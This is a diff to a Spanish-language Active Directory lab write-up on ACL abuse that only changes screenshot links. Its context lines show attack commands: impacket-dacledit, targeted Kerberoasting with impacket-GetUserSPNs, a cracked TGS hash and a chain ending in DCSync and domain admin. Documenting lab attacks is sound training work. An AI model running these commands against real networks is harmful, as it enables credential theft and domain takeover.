@@ -33,7 +33,7 @@ impacket-dacledit atackcorp.local/fin.garcia:'Finance2024!' \
 [*]     Access mask      : ReadControl, WriteProperties, Self (0x20028)
 ```
 
-> 📸 Captura: `fase13-01-genericwrite-dacledit.png`
+> 📸 Captura: ![fase13-01](../sceenshots/FASE-13-ACL-Abuse/fase13-01-genericwrite-dacledit.png)
 
 ### Interpretación del Access Mask
 
@@ -110,7 +110,7 @@ impacket-GetUserSPNs atackcorp.local/fin.garcia:'Finance2024!' \
 $krb5tgs$23$*sql_svc$ATACKCORP.LOCAL$atackcorp.local/sql_svc*$b332f4fc...
 ```
 
-> 📸 Captura: `fase13-02-targeted-kerberoast-spn.png`
+> 📸 Captura: ![fase13-02](../sceenshots/FASE-13-ACL-Abuse/fase13-02-targeted-kerberoast-spn.png)
 
 ---
 
@@ -167,7 +167,7 @@ john /tmp/sql_svc_tgs.hash --show --format=krb5tgs
 # ?:SQLService2024!
 ```
 
-> 📸 Captura: `fase13-03-kerberoast-cracked.png`
+> 📸 Captura: ![fase13-03](../sceenshots/FASE-13-ACL-Abuse/fase13-03-kerberoast-cracked.png)
 
 **Contraseña obtenida:** `sql_svc:SQLService2024!`  
 **Tiempo de cracking:** < 1 segundo con diccionario OSINT de 17 entradas
@@ -200,7 +200,7 @@ sql_svc comprometida (SQLService2024!)
   → DCSync como DC-01$ → todos los hashes del dominio → DA ✅
 ```
 
-> 📸 Captura: `fase13-04-sqlsvc-access-confirmed.png`
+> 📸 Captura: ![fase13-04](../sceenshots/FASE-13-ACL-Abuse/fase13-04-sqlsvc-access-confirmed.png)
 
 ---
 
